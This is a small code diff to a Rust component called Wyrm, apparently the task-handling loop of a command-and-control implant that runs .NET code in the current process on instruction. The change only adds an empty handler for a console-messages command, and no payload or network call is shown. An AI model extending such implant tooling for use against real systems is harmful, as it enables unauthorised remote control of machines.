@@ -323,6 +323,8 @@ impl Wyrm {
                     let result = Some(execute_dotnet_current_process(&task.metadata));
                     self.push_completed_task(&task, result);
                 }
+                // This should never be received as a task
+                Command::ConsoleMessages => (),
             }
         }
     }
